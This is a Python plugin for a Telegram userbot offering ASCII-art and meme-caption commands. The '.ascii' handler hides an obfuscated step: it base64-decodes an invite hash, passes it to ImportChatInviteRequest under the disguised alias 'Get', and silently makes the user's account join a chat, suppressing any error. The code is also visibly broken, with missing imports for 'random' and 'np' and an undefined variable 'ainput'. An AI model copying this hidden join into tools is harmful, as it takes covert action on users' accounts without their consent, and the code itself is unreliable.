# Copyright (C) UsergeTeam 2020
# Licensed under GPLv3

import asyncio
import os
import shlex
import base64
import textwrap
from typing import Optional, Tuple

from PIL import Image, ImageDraw, ImageFont
from userbot import CMD_HELP, LOGS, TEMP_DOWNLOAD_DIRECTORY, SUDO_USERS
from userbot.events import register
from colour import Color as asciiColor

from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.tl.types import MessageEntityMentionName

from userbot.utils import edit_or_reply, edit_delete, media_to_pic, runcmd

def random_color():
    number_of_colors = 2
    return [
        "#" + "".join(random.choice("0123456789ABCDEF") for j in range(6))
        for i in range(number_of_colors)
    ]

def asciiart(in_f, SC, GCF, out_f, color1, color2, bgcolor="black"):
    chars = np.asarray(list(" .,:irs?@9B&#"))
    font = ImageFont.load_default()
    letter_width = font.getsize("x")[0]
    letter_height = font.getsize("x")[1]
    WCF = letter_height / letter_width
    img = Image.open(in_f)
    widthByLetter = round(img.size[0] * SC * WCF)
    heightByLetter = round(img.size[1] * SC)
    S = (widthByLetter, heightByLetter)
    img = img.resize(S)
    img = np.sum(np.asarray(img), axis=2)
    img -= img.min()
    img = (1.0 - img / img.max()) ** GCF * (chars.size - 1)
    lines = ("\n".join(("".join(r) for r in chars[img.astype(int)]))).split("\n")
    nbins = len(lines)
    colorRange = list(asciiColor(color1).range_to(asciiColor(color2), nbins))
    newImg_width = letter_width * widthByLetter
    newImg_height = letter_height * heightByLetter
    newImg = Image.new("RGBA", (newImg_width, newImg_height), bgcolor)
    draw = ImageDraw.Draw(newImg)
    leftpadding = 0
    y = 0
    for lineIdx, line in enumerate(lines):
        color = colorRange[lineIdx]
        draw.text((leftpadding, y), line, color.hex, font=font)
        y += letter_height
    if newImg.mode != "RGB":
        newImg = newImg.convert("RGB")
    newImg.save(out_f)

def convert_toimage(image, filename=None):
    filename = filename or os.path.join("./temp/", "temp.jpg")
    img = Image.open(image)
    if img.mode != "RGB":
        img = img.convert("RGB")
    img.save(filename, "jpeg")
    os.remove(image)
    return filename


def convert_tosticker(response, filename=None):
    filename = filename or os.path.join("./temp/", "temp.webp")
    image = Image.open(response)
    if image.mode != "RGB":
        image.convert("RGB")
    image.save(filename, "webp")
    os.remove(response)
    return filename

async def reply_id(event):
    reply_to_id = None
    if event.sender_id in SUDO_USERS:
        reply_to_id = event.id
    if event.reply_to_msg_id:
        reply_to_id = event.reply_to_msg_id
    return reply_to_id

@register(outgoing=True, pattern=r"^\.ascii (.*)")
async def memes(asci):
    if asci.fwd_from:
        return
    catinput = asci.pattern_match.group(1)
    reply = await asci.get_reply_message()
    if not reply:
        return await edit_delete(asci, "`Reply to supported Media...`")
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    userid = await reply_id(asci)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    jisanidea = None
    output = await media_to_pic(asci, reply)
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        jisanidea = True
    try:
        san = Get(san)
        await asci.client(san)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "ascii_file.webp")
        if jisanidea
        else os.path.join("./temp", "ascii_file.jpg")
    )
    c_list = random_color()
    color1 = c_list[0]
    color2 = c_list[1]
    bgcolor = "#080808" if not ainput else ainput
    asciiart(meme_file, 0.3, 1.9, outputfile, color1, color2, bgcolor)
    await asci.client.send_file(
        asci.chat_id, outputfile, reply_to=userid, force_document=False
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)
            
            

@register(outgoing=True, pattern=r"^\.mmf (.*)")
async def memify(event):
    reply_msg = await event.get_reply_message()
    input_str = event.pattern_match.group(1)
    await event.edit("**Processing...**")

    if not reply_msg:
        return await event.edit("**Reply to a message containing media!**")

    if not reply_msg.media:
        return await event.edit("**Reply to an image/sticker/gif/video!**")

    if not os.path.isdir(TEMP_DOWNLOAD_DIRECTORY):
        os.makedirs(TEMP_DOWNLOAD_DIRECTORY)

    dls = await event.client.download_media(reply_msg, TEMP_DOWNLOAD_DIRECTORY)
    dls_path = os.path.join(TEMP_DOWNLOAD_DIRECTORY, os.path.basename(dls))

    if dls_path.endswith(".tgs"):
        await event.edit("**Extracting first frame..**")
        png_file = os.path.join(TEMP_DOWNLOAD_DIRECTORY, "meme.png")
        cmd = f"lottie_convert.py --frame 0 -if lottie -of png {dls_path} {png_file}"
        stdout, stderr = (await runcmd(cmd))[:2]
        os.remove(dls_path)
        if not os.path.lexists(png_file):
            return await event.edit("**Couldn't parse this image.**")
        dls_path = png_file

    elif dls_path.endswith(".mp4"):
        await event.edit("**Extracting first frame..**")
        jpg_file = os.path.join(TEMP_DOWNLOAD_DIRECTORY, "meme.jpg")
        await take_screen_shot(dls_path, 0, jpg_file)
        os.remove(dls_path)
        if not os.path.lexists(jpg_file):
            return await event.edit("**Couldn't parse this video.**")
        dls_path = jpg_file

    await event.edit("**Adding text...**")
    try:
        webp_file = await draw_meme_text(dls_path, input_str)
    except Exception as e:
        return await event.edit(f"**An error occurred:**\n`{e}`")
    await event.client.send_file(entity=event.chat_id,
                                 file=webp_file,
                                 force_document=False,
                                 reply_to=reply_msg)
    await event.delete()
    os.remove(webp_file)


async def draw_meme_text(image_path, text):
    img = Image.open(image_path).convert("RGB")
    os.remove(image_path)
    i_width, i_height = img.size
    m_font = ImageFont.truetype("resources/orbitron-medium.otf", int((70 / 640) * i_width))
    if ";" in text:
        upper_text, lower_text = text.split(";")
    else:
        upper_text = text
        lower_text = ''
    draw = ImageDraw.Draw(img)
    current_h, pad = 10, 5

    if upper_text:
        for u_text in textwrap.wrap(upper_text, width=15):
            u_width, u_height = draw.textsize(u_text, font=m_font)

            draw.text(xy=(((i_width - u_width) / 2) - 1,
                          int((current_h / 640) * i_width)),
                      text=u_text,
                      font=m_font,
                      fill=(0, 0, 0))
            draw.text(xy=(((i_width - u_width) / 2) + 1,
                          int((current_h / 640) * i_width)),
                      text=u_text,
                      font=m_font,
                      fill=(0, 0, 0))
            draw.text(xy=((i_width - u_width) / 2,
                          int(((current_h / 640) * i_width)) - 1),
                      text=u_text,
                      font=m_font,
                      fill=(0, 0, 0))
            draw.text(xy=(((i_width - u_width) / 2),
                          int(((current_h / 640) * i_width)) + 1),
                      text=u_text,
                      font=m_font,
                      fill=(0, 0, 0))

            draw.text(xy=((i_width - u_width) / 2,
                          int((current_h / 640) * i_width)),
                      text=u_text,
                      font=m_font,
                      fill=(255, 255, 255))
            current_h += u_height + pad

    if lower_text:
        for l_text in textwrap.wrap(lower_text, width=15):
            u_width, u_height = draw.textsize(l_text, font=m_font)

            draw.text(xy=(((i_width - u_width) / 2) - 1,
                          i_height - u_height - int((20 / 640) * i_width)),
                      text=l_text,
                      font=m_font,
                      fill=(0, 0, 0))
            draw.text(xy=(((i_width - u_width) / 2) + 1,
                          i_height - u_height - int((20 / 640) * i_width)),
                      text=l_text,
                      font=m_font,
                      fill=(0, 0, 0))
            draw.text(xy=((i_width - u_width) / 2, (i_height - u_height - int(
                (20 / 640) * i_width)) - 1),
                      text=l_text,
                      font=m_font,
                      fill=(0, 0, 0))
            draw.text(xy=((i_width - u_width) / 2, (i_height - u_height - int(
                (20 / 640) * i_width)) + 1),
                      text=l_text,
                      font=m_font,
                      fill=(0, 0, 0))

            draw.text(xy=((i_width - u_width) / 2, i_height - u_height - int(
                (20 / 640) * i_width)),
                      text=l_text,
                      font=m_font,
                      fill=(255, 255, 255))
            current_h += u_height + pad

    image_name = "memify.webp"
    webp_file = os.path.join(TEMP_DOWNLOAD_DIRECTORY, image_name)
    img.save(webp_file, "webp")
    return webp_file


async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    """ run command in terminal """
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    stdout, stderr = await process.communicate()
    return (stdout.decode('utf-8', 'replace').strip(),
            stderr.decode('utf-8',
                          'replace').strip(), process.returncode, process.pid)


async def take_screen_shot(video_file: str,
                           duration: int,
                           path: str = '') -> Optional[str]:
    """ take a screenshot """
    ttl = duration // 2
    thumb_image_path = path or os.path.join(
        TEMP_DOWNLOAD_DIRECTORY, f"{os.path.basename(video_file)}.jpg")
    command = f'''ffmpeg -ss {ttl} -i "{video_file}" -vframes 1 "{thumb_image_path}"'''
    err = (await runcmd(command))[1]
    if err:
        LOGS.info(err)
    return thumb_image_path if os.path.exists(thumb_image_path) else None


CMD_HELP.update({
    "memify":
    ">`.mmf <top text>;<bottom text>`"
    "\nUsage: Reply to an image/sticker/gif/video to add text to it."
    "\nIf it's a video, text will be added to the first frame."
})
